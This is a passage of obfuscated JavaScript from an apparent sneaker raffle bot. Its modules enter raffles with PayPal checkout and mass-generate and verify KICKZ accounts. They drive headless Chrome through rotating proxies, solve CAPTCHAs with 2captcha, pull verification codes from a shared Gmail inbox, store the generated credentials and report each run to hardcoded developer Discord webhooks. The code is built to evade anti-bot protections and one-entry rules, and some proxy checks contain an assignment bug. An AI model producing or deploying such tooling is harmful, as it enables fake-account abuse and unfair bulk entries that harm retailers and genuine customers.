                                '--proxy-server=' + _0x3ecca4[0x0] + ':' + _0x3ecca4[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x14b7de = await _0x506e0b['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x3ecca4[0x0] + ':' + _0x3ecca4[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x420565 = await _0x14b7de['newPage']();
                        await _0x420565['authenticate']({
                            'username': '' + _0x3ecca4[0x2],
                            'password': '' + _0x3ecca4[0x3]
                        }), console['log'](_0x5c19a0() + '\x20[' + _0x1602f5['name'] + ']\x20Task\x20' + (_0x57f00f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x420565['setRequestInterception'](!![]), _0x420565['on']('request', _0x5df686 => {
                            _0x5df686['resourceType']() === 'image' || _0x5df686['resourceType']() === 'font' || _0x5df686['resourceType']() === 'media' ? _0x5df686['abort']() : _0x5df686['continue']();
                        });
                        try {
                            await _0x420565['goto']('' + _0x28f41b[_0x57f00f]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x420565['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x5c19a0() + '\x20[' + _0x1602f5['name'] + ']\x20Task\x20' + (_0x57f00f + 0x1) + '\x20:\x20Filling\x20Information'), await _0x420565['type']('#comp_firstname', '' + _0x28f41b[_0x57f00f]['FirstName']), await _0x420565['waitForSelector']('#comp_lastname'), await _0x420565['type']('#comp_lastname', '' + _0x28f41b[_0x57f00f]['LastName']), await _0x420565['waitForSelector']('#comp_email'), await _0x420565['type']('#comp_email', '' + _0x28f41b[_0x57f00f]['Email']), await _0x420565['waitForSelector']('#comp_paypalemail'), await _0x420565['type']('#comp_paypalemail', '' + _0x28f41b[_0x57f00f]['Email']), await _0x420565['waitForSelector']('#comp_mobile_end'), await _0x420565['type']('#comp_mobile_end', '' + _0x28f41b[_0x57f00f]['Phone']), await _0x420565['waitForSelector']('#comp_dob'), await _0x420565['type']('#comp_dob', '08/09/1992'), console['log'](_0x5c19a0() + '\x20[' + _0x1602f5['name'] + ']\x20Task\x20' + (_0x57f00f + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x28f41b[_0x57f00f]['Size'] == 'RANDOM') {
                            const _0x5b8b92 = await _0x420565['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x3528cd => {
                                return _0x3528cd['map'](_0x45bc4f => _0x45bc4f['value']);
                            });
                            var _0x182168 = Math['round'](Math['random']() * (_0x5b8b92['length'] - 0x2));
                            await _0x420565['select']('#shoesize', _0x5b8b92[_0x182168 + 0x1]), await _0x1a282d(0x3e8);
                        } else {
                            const _0x6dfe36 = await _0x420565['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x76b183 => {
                                return _0x76b183['map'](_0xd47d4d => _0xd47d4d['innerText']);
                            }), _0x3fd6ce = await _0x420565['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x161216 => {
                                return _0x161216['map'](_0x2d8e0f => _0x2d8e0f['value']);
                            });
                            var _0x5d99be = _0x28f41b[_0x57f00f]['Size'];
                            for (var _0x457f05 = 0x1; _0x457f05 < _0x3fd6ce['length']; _0x457f05++) {
                                var _0x1c2802 = _0x6dfe36[_0x457f05]['split']('\x20')[0x0];
                                if (_0x1c2802 == _0x5d99be) {
                                    await _0x420565['select']('#shoesize', _0x3fd6ce[_0x457f05]);
                                    break;
                                } else {
                                    if (_0x457f05 + 0x1 == _0x3fd6ce['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x420565['waitForSelector']('#comp_address1'), await _0x420565['type']('#comp_address1', _0x28f41b[_0x57f00f]['Address1'] + '\x20' + _0x28f41b[_0x57f00f]['HouseNumber']), await _0x420565['waitForSelector']('#comp_address2'), await _0x420565['type']('#comp_address2', '' + _0x28f41b[_0x57f00f]['Address2']), await _0x420565['waitForSelector']('#comp_address2'), await _0x420565['type']('#comp_address3', '' + _0x28f41b[_0x57f00f]['City']), await _0x420565['waitForSelector']('#comp_postcode'), await _0x420565['type']('#comp_postcode', '' + _0x28f41b[_0x57f00f]['Zip']), console['log'](_0x5c19a0() + '\x20[' + _0x1602f5['name'] + ']\x20Task\x20' + (_0x57f00f + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x1a282d(0x4b0), await _0x420565['click']('label#emailhold'), await _0x1a282d(0x5dc), await _0x420565['click']('#preauth_tandc_email\x20>\x20label'), await _0x1a282d(0x5dc), await _0x420565['click']('#submit');
                        try {
                            await _0x420565['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x5c19a0() + '\x20[' + _0x1602f5['name'] + ']\x20Task\x20' + (_0x57f00f + 0x1) + '\x20:\x20' + _0x17b918['blue']('Awaiting\x20Paypal\x20Payment')), _0x14b7de['on']('targetcreated', async _0x417625 => {
                            if (_0x417625['type']() === 'page') {
                                const _0xbe89c = await _0x417625['page']();
                                async function _0x57f938() {
                                    try {
                                        await _0x420565['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0xcf0f51 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x2fe4c6() {
                                    try {
                                        await _0x420565['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x381457 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x2fe4c6(), _0x57f938(), await _0x1a282d(0x493e0);
                            }
                        });
                        async function _0x3e65b8() {
                            for (let _0x138e10 = 0x0; _0x138e10 < 0x12c; _0x138e10++) {
                                if (_0x381457 == !![]) {
                                    _0x3e9a77 = 'no', _0xe19c06(_0x28f41b[_0x57f00f], _0x1602f5), console['log'](_0x17b918['green'](_0x5c19a0() + '\x20[' + _0x1602f5['name'] + ']\x20Task\x20' + (_0x57f00f + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '')
                                        try {
                                            await _0x4e4e57(_0x64917e['webhook'], _0x1d69d2['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x1a282d(0xc8), await _0x4e4e57(_0xd2142c, _0x1d69d2['succesDEVMSG']), await _0x1a282d(0xc8);
                                    try {
                                        await _0x4e4e57(_0x1274a5, _0x1d69d2['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0xcf0f51)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x1a282d(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x1a282d(0xbb8), await _0x420565['click']('.zoid-outlet'), await _0x1a282d(0x7d0), await _0x3e65b8();
                    } catch (_0x378fdf) {
                        console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x1602f5['name'] + ']\x20Task\x20' + (_0x57f00f + 0x1) + '\x20:\x20' + _0x378fdf)), _0x1a3a01 = '' + _0x378fdf;
                        var _0x5dd2de = await _0x4ee25a(_0x28f41b[_0x57f00f], _0x1602f5, 'dev', !![], _0x1a3a01);
                        _0x1d69d2['errorDEV'] = { 'embeds': [_0x5dd2de] }, _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x1d69d2['errorDEV']), await _0x4e4e57(_0x4cd13, _0x1d69d2['errorDEV']);
                    } finally {
                        _0x14b7de && _0x14b7de['close']();
                        if (_0x3e9a77 == 'yes' && _0x87a420 != 0x5 && _0x1a3a01 != 'Size\x20Not\x20Found') {
                            console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x1602f5['name'] + ']\x20Task\x20' + (_0x57f00f + 0x1) + '\x20:\x20Retrying\x20(' + _0x87a420 + '\x20/\x205)')), _0x57f00f = _0x57f00f - 0x1, _0x87a420 = _0x87a420 + 0x1;
                            continue;
                        }
                        _0x3e9a77 == 'yes' && _0x87a420 >= 0x5 && (_0x1736ba(afew[_0x57f00f], _0x1602f5), _0x3e9a77 = 'no', _0x87a420 = 0x0), console['log']('Waiting\x20for\x20' + _0x64917e['delay'] + '\x20ms'), await _0x1a282d(_0x64917e['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x1ba031, _0x1cac30, _0x593e77) {
                    _0x506e0b['use'](_0x407d82()), _0x506e0b['use'](_0x29f88b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x64917e['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x52dabc = 0x0; _0x52dabc < _0x1cac30['length']; _0x52dabc++) {
                        const _0x380c8e = 'https://www.kickz.com/login';
                        if (_0x113168 != 'yes')
                            var _0x113168 = '', _0x641c30 = 0x0;
                        _0x51b97d(_0x1ba031['name'] + '\x20Task\x20' + (_0x52dabc + 0x1) + '\x20/\x20' + _0x1cac30['length'] + '\x20||\x20File:\x20' + _0x302fc2 + '\x20Proxies:\x20' + _0x252dfd);
                        try {
                            await _0x120beb(_0x1cac30, _0x52dabc);
                        } catch {
                            _0x113168 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x2fce5c = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x5b7d0c
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x64917e['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x1d5694
                                }
                            ]
                        }];
                        const _0x552ba6 = { 'embeds': _0x2fce5c };
                        var _0xf2b787 = await _0x4ee25a(_0x1cac30[_0x52dabc], _0x1ba031, 'acc', ![]);
                        const _0x21b233 = { 'succesDEVMSG': { 'embeds': [_0xf2b787] } };
                        if (_0x1cac30[_0x52dabc]['Email'] == '' || _0x1cac30[_0x52dabc]['FirstName'] == '' || _0x1cac30[_0x52dabc]['LastName'] == '') {
                            console['log'](_0x5c19a0() + '\x20[' + _0x1ba031['name'] + ']\x20Task\x20' + (_0x52dabc + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x1cac30[_0x52dabc]['Password'] == '' && (_0x1cac30[_0x52dabc]['Password'] = 'JRaffles23!');
                        if (_0x64917e['useRandomProxy'] = ![])
                            var _0x2bc22b = _0x593e77[_0x52dabc]['split'](':');
                        else
                            var _0x486ba1 = Math['round'](Math['random']() * (_0x593e77['length'] - 0x1)), _0x2bc22b = _0x593e77[_0x486ba1]['split'](':');
                        var _0xb0d95f;
                        try {
                            _0xb0d95f = await _0x506e0b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2bc22b[0x0] + ':' + _0x2bc22b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xb0d95f = await _0x506e0b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2bc22b[0x0] + ':' + _0x2bc22b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3b95f1 = await _0xb0d95f['newPage']();
                            await _0x3b95f1['authenticate']({
                                'username': '' + _0x2bc22b[0x2],
                                'password': '' + _0x2bc22b[0x3]
                            }), console['log'](_0x5c19a0() + '\x20[' + _0x1ba031['name'] + ']\x20Task\x20' + (_0x52dabc + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3b95f1['setRequestInterception'](!![]), _0x3b95f1['on']('request', _0x89a7a6 => {
                                _0x89a7a6['resourceType']() === 'image' || _0x89a7a6['resourceType']() === 'font' || _0x89a7a6['resourceType']() === 'media' ? _0x89a7a6['abort']() : _0x89a7a6['continue']();
                            }), await _0x3b95f1['goto'](_0x380c8e), await _0x1a282d(0xbb8), console['log'](_0x5c19a0() + '\x20[' + _0x1ba031['name'] + ']\x20Task\x20' + (_0x52dabc + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x3b95f1['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x3b95f1['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x3b95f1['waitForSelector']('#button-register'), await _0x1a282d(0x7d0), await _0x3b95f1['evaluate'](() => {
                                const _0x40e00d = document['querySelector']('#button-register');
                                _0x40e00d['click']();
                            }), console['log'](_0x5c19a0() + '\x20[' + _0x1ba031['name'] + ']\x20Task\x20' + (_0x52dabc + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x1a282d(0x1388), await _0x3b95f1['waitForSelector']('#customer_salutation'), await _0x3b95f1['select']('#customer_salutation', 'mr'), await _0x1a282d(0x7d0), await _0x3b95f1['waitForSelector']('#customer_firstname'), await _0x3b95f1['type']('#customer_firstname', '' + _0x1cac30[_0x52dabc]['FirstName']), await _0x1a282d(0x352), await _0x3b95f1['waitForSelector']('#customer_lastname'), await _0x3b95f1['type']('#customer_lastname', '' + _0x1cac30[_0x52dabc]['LastName']), await _0x1a282d(0x352), await _0x3b95f1['type']('#email-input', '' + _0x1cac30[_0x52dabc]['Email']), await _0x1a282d(0x352), await _0x3b95f1['type']('#email-confirm-input', '' + _0x1cac30[_0x52dabc]['Email']), await _0x1a282d(0x352), await _0x3b95f1['type']('#register-password', '' + _0x1cac30[_0x52dabc]['Password']), await _0x1a282d(0x352), await _0x3b95f1['type']('#password-confirm', '' + _0x1cac30[_0x52dabc]['Password']), await _0x1a282d(0x352), console['log'](_0x5c19a0() + '\x20[' + _0x1ba031['name'] + ']\x20Task\x20' + (_0x52dabc + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x3b95f1['click']('#consent'), await _0x1a282d(0x1f4);
                            const _0xa49130 = await _0x3b95f1['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0xa49130) {
                                console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x1ba031['name'] + ']\x20Task\x20' + (_0x52dabc + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x3b95f1['click']('#buttonRegister');
                            try {
                                await _0x3b95f1['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x5c19a0() + '\x20[' + _0x1ba031['name'] + ']\x20Task\x20' + (_0x52dabc + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x1cac30[_0x52dabc]['Email']), await _0x1a282d(0x4b0);
                            async function _0x4b0782() {
                                var _0x268bda, _0xf7054e = ![];
                                for (var _0x3aac2b = 0x0; _0x3aac2b < 0x18; _0x3aac2b++) {
                                    async function _0x20e1ca() {
                                        var _0x351a65 = new _0x27458e({
                                            'user': _0x64917e['masterMail'],
                                            'password': _0x64917e['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x2b872c(_0x243b63) {
                                            _0x351a65['openBox']('INBOX', ![], _0x243b63);
                                        }
                                        _0x351a65['once']('ready', function () {
                                            console['log'](_0x5c19a0() + '\x20[' + _0x1ba031['name'] + ']\x20Task\x20' + (_0x52dabc + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x2b872c(function (_0x2e971f, _0x36bb81) {
                                                console['log'](_0x5c19a0() + '\x20[' + _0x1ba031['name'] + ']\x20Task\x20' + (_0x52dabc + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x2e971f)
                                                    throw _0x2e971f;
                                                _0x351a65['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x35210f, _0x10ba98) {
                                                    if (!_0x10ba98 || !_0x10ba98['length'])
                                                        console['log'](_0x5c19a0() + '\x20[' + _0x1ba031['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x351a65['end']();
                                                    else {
                                                        var _0xaa1dcc = _0x351a65['seq']['fetch'](_0x10ba98, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0xaa1dcc['on']('message', function (_0x51c58f, _0x1a8be0) {
                                                            var _0x14b656 = '(#' + _0x1a8be0 + ')\x20';
                                                            _0x51c58f['on']('body', function (_0x3781ed, _0x63b5b6) {
                                                                _0x483479(_0x3781ed, (_0x3d6ff6, _0x58b205) => {
                                                                    if (_0x58b205['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x19d967 = _0x58b205['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x340edd = _0x19d967[0x1]['split']('<')[0x0];
                                                                        _0x268bda = _0x340edd;
                                                                    }
                                                                });
                                                            }), _0x51c58f['once']('end', function () {
                                                            });
                                                        }), _0xaa1dcc['once']('error', function (_0x11f580) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0xaa1dcc['once']('end', function () {
                                                            _0x351a65['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x351a65['once']('error', function (_0x115a6e) {
                                            console['log'](_0x17b918['red'](_0x115a6e['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0xf7054e = !![];
                                        }), _0x351a65['once']('end', async function () {
                                        }), _0x351a65['connect']();
                                    }
                                    _0x20e1ca(), await _0x1a282d(0x1388);
                                    if (_0x268bda)
                                        return _0x268bda;
                                    if (_0xf7054e)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x3aac2b == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x4b0782(), _0x1a282d(0x320), console['log'](_0x5c19a0() + '\x20[' + _0x1ba031['name'] + ']\x20Task\x20' + (_0x52dabc + 0x1) + '\x20:\x20Verifying..'), await _0x3b95f1['type']('#verificationCode', code), await _0x1a282d(0x1f4), await _0x3b95f1['click']('#buttonVerify'), await _0x1a282d(0x190), await _0x3b95f1['click']('#buttonVerify'), await _0x1a282d(0x3e8);
                            try {
                                await _0x3b95f1['waitForSelector']('div.b-user_greeting'), _0x113168 = 'no', console['log'](_0x17b918['green'](_0x5c19a0() + '\x20[' + _0x1ba031['name'] + ']\x20Task\x20' + (_0x52dabc + 0x1) + '\x20:\x20Account\x20' + _0x1cac30[_0x52dabc]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x5a26e1['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x1cac30[_0x52dabc]['Email'] + ',' + _0x1cac30[_0x52dabc]['Password'] + ','), console['log'](_0x5c19a0() + '\x20[' + _0x1ba031['name'] + ']\x20Task\x20' + (_0x52dabc + 0x1) + '\x20:\x20Account\x20' + _0x1cac30[_0x52dabc]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x21b233['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4e4e57(_0xb68945, _0x21b233['succesDEVMSG']);
                            } catch {
                                _0x113168 = 'no', console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x1ba031['name'] + ']\x20Task\x20' + (_0x52dabc + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x1ba031['name'] + ']\x20Task\x20' + (_0x52dabc + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x3a7103) {
                            console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x1ba031['name'] + ']\x20Task\x20' + (_0x52dabc + 0x1) + '\x20:\x20' + _0x3a7103)), _0x2fce5c[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x2fce5c[0x0]['description'] = '' + _0x3a7103, await _0x4e4e57(_0x4cd13, _0x552ba6), _0x113168 = 'yes';
                        } finally {
                            _0xb0d95f && _0xb0d95f['close']();
                            if (_0x113168 == 'yes' && _0x641c30 != 0x5) {
                                console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x1ba031['name'] + ']\x20Task\x20' + (_0x52dabc + 0x1) + '\x20:\x20Retrying\x20(' + _0x641c30 + '\x20/\x205)')), _0x52dabc = _0x52dabc - 0x1, _0x641c30 = _0x641c30 + 0x1;
                                continue;
                            }
                            _0x113168 == 'yes' && _0x641c30 >= 0x5 && (_0x1736ba(_0x1cac30[_0x52dabc], _0x1ba031), _0x113168 = 'no', _0x641c30 = 0x0), console['log']('Waiting\x20for\x20' + _0x64917e['delay'] + '\x20ms'), await _0x1a282d(_0x64917e['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x396349, _0x39a635, _0xe0163) {
                    _0x506e0b['use'](_0x407d82()), _0x506e0b['use'](_0x29f88b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x64917e['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1b6d88 = 0x0; _0x1b6d88 < _0x39a635['length']; _0x1b6d88++) {
                        var _0x3dd9a5;
                        if (_0xd8921 != 'yes')
                            var _0xd8921 = '', _0x1cb1cb = 0x0;
                        _0x51b97d(_0x396349['name'] + '\x20Task\x20' + (_0x1b6d88 + 0x1) + '\x20/\x20' + _0x39a635['length'] + '\x20||\x20File:\x20' + _0x302fc2 + '\x20Proxies:\x20' + _0x252dfd);
                        var _0x2001a1 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x5b7d0c
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x39a635[_0x1b6d88]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x39a635[_0x1b6d88]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x64917e['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x1d5694
                                }
                            ]
                        }], _0x42613d = await _0x4ee25a(_0x39a635[_0x1b6d88], _0x396349, 'dev', ![]), _0x9a945c = await _0x4ee25a(_0x39a635[_0x1b6d88], _0x396349, 'pub', ![]);
                        const _0x110b14 = {
                            'succesDEVMSG': { 'embeds': [_0x42613d] },
                            'succesPUBMSG': { 'embeds': [_0x9a945c] }
                        };
                        try {
                            await _0x120beb(_0x39a635, _0x1b6d88);
                        } catch {
                            _0xd8921 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x39a635[_0x1b6d88]['Email'] == '' || _0x39a635[_0x1b6d88]['Password'] == '' || _0x39a635[_0x1b6d88]['FirstName'] == '' || _0x39a635[_0x1b6d88]['LastName'] == '') {
                            console['log'](_0x5c19a0() + '\x20[' + _0x396349['name'] + ']\x20Task\x20' + (_0x1b6d88 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x64917e['useRandomProxy'] = ![])
                            var _0x1e73d8 = _0xe0163[_0x1b6d88]['split'](':');
                        else
                            var _0x1d70b0 = Math['round'](Math['random']() * (_0xe0163['length'] - 0x1)), _0x1e73d8 = _0xe0163[_0x1d70b0]['split'](':');
                        var _0x5754cb;
                        try {
                            _0x5754cb = await _0x506e0b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x1e73d8[0x0] + ':' + _0x1e73d8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5754cb = await _0x506e0b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x1e73d8[0x0] + ':' + _0x1e73d8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4feac7 = await _0x5754cb['newPage']();
                            await _0x4feac7['authenticate']({
                                'username': '' + _0x1e73d8[0x2],
                                'password': '' + _0x1e73d8[0x3]
                            }), console['log'](_0x5c19a0() + '\x20[' + _0x396349['name'] + ']\x20Task\x20' + (_0x1b6d88 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4feac7['setRequestInterception'](!![]), _0x4feac7['on']('request', _0x502b1c => {
                                _0x502b1c['resourceType']() === 'image' || _0x502b1c['resourceType']() === 'font' || _0x502b1c['resourceType']() === 'media' ? _0x502b1c['abort']() : _0x502b1c['continue']();
                            }), await _0x4feac7['goto']('' + _0x39a635[_0x1b6d88]['Url'], { 'waitUntil': 'networkidle2' }), await _0x1a282d(0x12c);
                            try {
                                await _0x4feac7['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x4feac7['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x5c19a0() + '\x20[' + _0x396349['name'] + ']\x20Task\x20' + (_0x1b6d88 + 0x1) + '\x20:\x20Logging\x20in'), await _0x4feac7['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x4feac7['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x4feac7['waitForSelector']('#username'), await _0x4feac7['type']('#username', _0x39a635[_0x1b6d88]['Email']), await _0x4feac7['waitForSelector']('#password'), await _0x4feac7['type']('#password', _0x39a635[_0x1b6d88]['Password']), await _0x1a282d(0x190), await _0x4feac7['click']('#buttonSubmit'), await _0x4feac7['waitForSelector']('div.b-user_greeting'), console['log'](_0x5c19a0() + '\x20[' + _0x396349['name'] + ']\x20Task\x20' + (_0x1b6d88 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x1a282d(0x1f4), await _0x4feac7['goto']('' + _0x39a635[_0x1b6d88]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x5c19a0() + '\x20[' + _0x396349['name'] + ']\x20Task\x20' + (_0x1b6d88 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x39a635[_0x1b6d88]['Size']);
                            let _0x5f721e = _0x39a635[_0x1b6d88]['Size']['replace']('.5', '\x201/2');
                            await _0x4feac7['click']('button[title=\x22' + _0x5f721e + '\x22]'), await _0x1a282d(0x1f4);
                            try {
                                await _0x4feac7['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x1a282d(0x12c), console['log'](_0x5c19a0() + '\x20[' + _0x396349['name'] + ']\x20Task\x20' + (_0x1b6d88 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x4feac7['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x1a282d(0x12c), await _0x4feac7['type']('#dwfrm_raffle_addressFields_firstName', _0x39a635[_0x1b6d88]['FirstName']), await _0x1a282d(0x12c), await _0x4feac7['type']('#dwfrm_raffle_addressFields_lastName', _0x39a635[_0x1b6d88]['LastName']), await _0x1a282d(0x12c), await _0x4feac7['select']('#dwfrm_raffle_addressFields_country', _0x39a635[_0x1b6d88]['Country']), await _0x1a282d(0x12c), await _0x4feac7['type']('#dwfrm_raffle_addressFields_city', _0x39a635[_0x1b6d88]['City']), await _0x1a282d(0x12c);
                            _0x39a635[_0x1b6d88]['Postcode'] == undefined && (_0x39a635[_0x1b6d88]['Postcode'] = _0x39a635[_0x1b6d88]['Zip']);
